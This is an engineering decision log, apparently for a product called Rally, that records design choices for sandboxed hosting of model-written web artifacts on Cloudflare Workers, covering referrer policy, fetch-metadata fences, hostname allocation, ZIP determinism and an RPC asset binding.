**Considered and rejected:** Injecting padding or CSS into the artifact would
alter model-authored layout and could be undone by the page; wrapping the page
in Rally renderer content would cross the isolation boundary that keeps remote
artifact code out of the application DOM. A native title bar already owns the
controls, shows the bounded artifact title, and keeps the content surface
unchanged.

**Consequences:** Pop-outs gain a small native title area, and artifact content
starts below it on macOS. The embedded rail preview is unchanged because it has
no native window controls.

### 2026-09-02 — The redeem bootstrap keeps its same-origin identity

**What changed:** The Rally-authored `/__rally/open` bootstrap now carries
`Referrer-Policy: same-origin`; artifact documents, errors, and every other
response keep the default `no-referrer` policy.

**Why:** A production Electron trace showed the bootstrap reaching the artifact
Worker and preserving its one-time code, then Chromium submitting the
same-origin redeem form with `Sec-Fetch-Site: same-origin` but `Origin: null`.
The fetch-metadata fence correctly rejected that opaque origin with 403, so the
rail rendered the neutral "Open this from Rally" page instead of the artifact.
The `null` was produced by the bootstrap response inheriting the artifact
page's `no-referrer` policy.

**Considered and rejected:** Relaxing the origin mismatch check would admit an
opaque initiator wherever fetch metadata happened to say same-origin; moving the
code into a query parameter would put it in Cloudflare request logs; and
changing the policy on artifact content would weaken a protection unrelated to
redemption. Replacing the native form with `fetch()` would preserve a real
Origin under `no-referrer`, but it would make the bootstrap script reproduce the
navigation and neutral-error behavior the form already supplies. The bootstrap
is Rally-owned, has one same-origin form action, and never exposes its fragment
in a Referer, so giving only that response a same-origin policy is the smaller
and cheaper-to-reverse repair.

**Consequences:** Chromium-based Rally surfaces can redeem the single-use code
and receive their viewer cookie. Only the bootstrap path can be sent as a
same-origin referrer, while the fragment proof remains client-only and the
resulting artifact page continues to send no referrer. Unit and route-level
regressions lock both the policy split and refusal of the production
`Sec-Fetch-Site: same-origin` plus `Origin: null` pair.

### 2026-09-01 — Review closes navigation, retry, and local-setup gaps

**What changed:** Artifact surfaces now fence redirects as well as ordinary
navigations, initial preview loads share one abort-aware result across concurrent
presenters, and failed pop-out loads close. Public host parsing is total, desktop
host admission accepts only the two artifact label shapes, platform D1 is part of
fresh local migration setup and the runtime binding contract, and publication
reserves a new hostname before mutating the resource row.

**Why:** Review found three failure windows hidden by individually reasonable
steps. Handing artifact contents from the global fence to the origin fence also
handed redirects over, but the origin fence only listened for navigation. An
Electron `loadURL()` promise reports `ERR_ABORTED` when the bootstrap starts its
intended redemption POST, so treating every rejection as terminal can destroy a
healthy rail while a second caller has already reported success. And reserving a
hostname after a resource swap lets a D1 outage make the retry's equal-content
path return the previous artifact version. The local binding also existed before
its separate migration chain ran, making fresh development fail only at first
use.

**Considered and rejected:** Restoring the global artifact block would break the
same-origin redemption again; ignoring all `loadURL()` failures would restore
blank DNS/TLS views; moving the resource row before reservation would preserve a
retry trap; and teaching the regional migration discovery about a shared chain
would blur the deliberate regional/platform ownership boundary.

**Consequences:** Both navigation event types stay under the artifact-origin
owner; concurrent presentations agree on initial-load success; `ERR_ABORTED` is
the one non-terminal Electron load result; fresh local setup applies the shared
schema into both region state directories; and browser-local data under a legacy
UUID origin is intentionally not migrated to its readable successor.

### 2026-09-01 — Readable origins use a content-free platform route index

**What changed:** New and existing generated sites receive a deterministic
four-word public hostname of the form
`<stub>-<region>.rallyusercontent.com`. A dedicated platform-shared D1 database
reserves `(region, hostname_stub)` permanently and resolves it to the existing
UUID-addressed `ArtifactHostDO`; legacy UUID hosts remain valid.

**Why:** UUID origins made a generated site look like infrastructure rather than
something a person could recognize or share. The established stub generator
already provides the product's readable naming vocabulary, but a workspace-local
registry cannot prevent two workspaces choosing the same public origin.

**Considered and rejected:** R2 was considered as the route index, but a
point-read D1 table is cheaper for this read-heavy workload and gives the
allocator atomic uniqueness constraints. Reusing either regional product D1
would make one region authoritative for the other; duplicating rows would allow
the two allocators to collide. The chosen shared D1 stores only the opaque stub,
region, artifact UUID, and creation time—not workspace identity, content, viewer
identity, or session state.

**Consequences:** `*.rallyusercontent.com` must exist as one proxied wildcard DNS
record before either artifact Worker is promoted. Deployments promote the
backward-compatible serving Worker before the API begins minting stub origins.
Hostname rows are permanent tombstones, while all authorization, content,
sessions, Durable Objects, and R2 bytes remain in the workspace's region.

### 2026-09-01 — Archive determinism uses the ZIP calendar, not a UTC instant

**What changed:** Directory archives pin every entry to local-calendar
`1980-01-01 00:00:00`, the earliest DOS timestamp ZIP can encode, rather than
passing the UTC instant for that date to the encoder.

**Why:** `fflate` validates and serializes ZIP timestamps through local calendar
fields. West of UTC, the UTC instant was still `1979-12-31` locally, so archive
publication threw `date not in range 1980-2099` even though the intended date
looked valid in source.

**Considered and rejected:** Moving to a later UTC instant would hide the
timezone conversion only for some offsets and make the chosen date arbitrary.

**Consequences:** Every timezone encodes the same DOS calendar fields and
therefore the same archive bytes; unchanged republish deduplication remains
stable.

### 2026-09-01 — `ASSETS` becomes an exported entrypoint, because nothing else crosses

**What changed:** The `ASSETS` binding is now `ArtifactAssetLoopback`, a
`WorkerEntrypoint` exported from both the API Worker and the serving Worker and
minted per artifact version through `ctx.exports`. A Rally-authored wrapper
inside the isolate accepts the relative string the contract promises. A
stateless active site's module is now imported by a Rally entry module rather
than run directly, so both modes build the same env.

**Why:** The facet ran with an empty env and the loader path passed a plain
object carrying a `fetch`. Both were broken: the first left `this.env.ASSETS`
undefined, and the second threw `DataCloneError` on the first request, so every
**active** site — stateless and stateful alike — failed on any path its model
did not hand-write. Only static sites worked. The loader path had no test of any
kind, which is why the second half went unseen; it has one now, and the facet
fixture serves its own page through the binding instead of a hand-written
`Response` that proved the routing and hid the binding.

The repair is not obvious and the three obvious attempts all fail, so they are
recorded rather than left for the next person: a plain `{ fetch }`, an
`RpcTarget`, and the R2 bucket itself each fail with `DataCloneError`, because
the loader serializes env values. Cloudflare's own `cloudflare-os` hit this and
documents it in the same words; the `ctx.exports` loopback is their pattern.

**What a future change has to respect:** the entrypoint stays exported from
*both* entries, because `ctx.exports` is the running Worker's own exports; its
method surface stays one `fetch`, because it executes with that Worker's full
env and the props are the only thing scoping it to one artifact; and the
in-isolate wrapper stays, because the string form is a published contract that a
stub cannot satisfy on its own. The cost accepted here is a hop per asset back
into the exporting Worker, on top of the per-request supervisor hop that
`VISIBILITY_CACHE_MS` already implies — the alternative, serving assets in
Rally's layer before model code, was rejected because it takes route precedence
away from the model and deletes the server-side data read the skill teaches.

### 2026-09-01 — Review triage: drop the quota leftover, correct three claims

**What changed:** Removed the facet host's `rallySize`, and corrected three
statements in this document that no longer matched the code.

**Why:** Review found that a 100 MB write ceiling could not be enforced from a
host that composes the model's class — artifact code writes through its own
native `ctx.storage` handle during any method, GET included, so the threshold
could be crossed by an unbounded amount before any check ran, and refusing the
*next* request would have blocked reads without restoring the bound. The
promise was dropped rather than reworded, but its read stayed behind as an
unreachable RPC method on a security boundary; it is gone now, and this
document's RPC list no longer names it.

The other two are the more instructive kind. The fetch-metadata rule shipped
classifying on `Sec-Fetch-Mode`/`Sec-Fetch-Dest` after review showed
`Sec-Fetch-Site: none` misses link clicks and redirects — but this document was
left describing the rule the code had *stopped* applying, which is worse than
either version alone, because the next reader would have trusted it. And the
off-origin navigation refusal was written as though it were a property of the
fence rather than of the desktop container: CSP has no directive over where a
document navigates itself, so in a plain browser tab the channel is open. A
future change must respect that this is deliberately two claims — no off-origin
*fetch* anywhere, no off-origin *navigation* in Rally's own surfaces — and not
collapse them back into one by adding a header that appears to cover both.

### 2026-09-01 — The publish, serving, and facet layers land

**What changed:** Directory publishing, the artifact serving Worker with its
three fences, `ArtifactHostDO` and its facet data plane, the read-only SQL
admission, and the access-revocation workspace hop.

**Why:** The document pipeline shipped and immediately exposed its boundary —
the model writes excellent HTML and the only exit made it a text resource. The
gap was never generation; it was hosting, and Cloudflare's Worker Loader is
exactly the missing piece: model-written code executed at request time in a fresh
isolate with capability-based sandboxing, no deploy pipeline and no per-artifact
Cloudflare resources.

At that release, four decisions were recorded. The first—**the artifact id is
the hostname label**—was superseded by the readable-origin entry above; the
remaining UUID-addressed supervisor identity is still why the serving Worker can
reach the right object after the platform lookup. The original reasoning was:
the serving Worker could reach the right object holding
nothing but a `Host` header; an earlier draft minted short labels from a regional
allocator and rejected "addressing by artifact id" along with the
hostname→id index it was actually arguing against — the id needs no index because
the host *was* the id, and a UUID is region-wide unique for free. **The host class
composes the model's class rather than extending it**, because a subclass would
put Rally's method names in the model's namespace and win every collision, and
`query`/`describe`/`page` are exactly what a model names its own SQL helpers.
**Read-only is enforced on the statement, not by the transaction**, because
caller SQL can commit mid-payload and leave the writes behind. **The artifacts
hop hangs off the workspace**, not the work stream, because `artifact_registry`
lives in WorkspaceDO and only the object holding a list can name its children.

What was rejected: a dedicated `publish_site` tool (a tenth family member whose
rules would be identical to the ninth's, added to carry parameters the file-layout
contract deletes); a mode parameter (it can disagree with the files); tar.gz for
archives (the engineer's default, losing to a recipient who can double-click a
zip); and an `<iframe>` for the rail preview (it would widen the renderer CSP to a
wildcard artifact host and graft remote model-authored content into the
application DOM).

**`ASSETS` is an RPC stub, and it cannot be anything else.** A dynamically
loaded worker's `env` is a plain object whose values the loader *serializes*,
and it rejects a value carrying a function with `DataCloneError` — a plain
`{ fetch }`, an `RpcTarget`, and an R2 bucket binding each fail, and the first
of those shipped and threw on the first request of every active site. What
crosses is a stub minted from `ctx.exports`, an RPC reference to a real
exported entrypoint. `ArtifactAssetLoopback` is that entrypoint; it holds the
bucket in the Worker that exports it and hands the isolate a reference that can
read one version's published files and nothing else. It is exported from
**both** entries — the API Worker mints it for a facet, the serving Worker for a
loader isolate — because `ctx.exports` is the running Worker's own exports.

**A stub's `fetch` is the runtime's Fetcher, so the string form needs a
wrapper.** The declared contract is `fetch(request: Request | string)`, and the
skill teaches `env.ASSETS.fetch("/signups.json")` for reading a published data
file server-side; a stub throws `Invalid URL: /signups.json` on that, in the
caller, before the stub is dialled. So a Rally-authored wrapper runs *inside*
the isolate — the facet host already builds the env it hands `SiteData`, and a
stateless active site gets a Rally entry module in front of its own that does
the same. Both modes therefore present one contract, which is the point: a
model writes the same asset fallback either way.

**Not yet built:** the rail's site detail exists and is tested but is not yet
*mounted* — `inspector-rail.tsx` still renders the ordinary resource card for a
site, and the flag that will gate it is wired end to end but reads nowhere. The
overlay signal the main process accepts has no renderer caller yet either, so a
dialog opened over a live preview would still be painted over. Nothing that
protects data is scoped by the flag: an artifact's authorization is structural
and holds with it off.
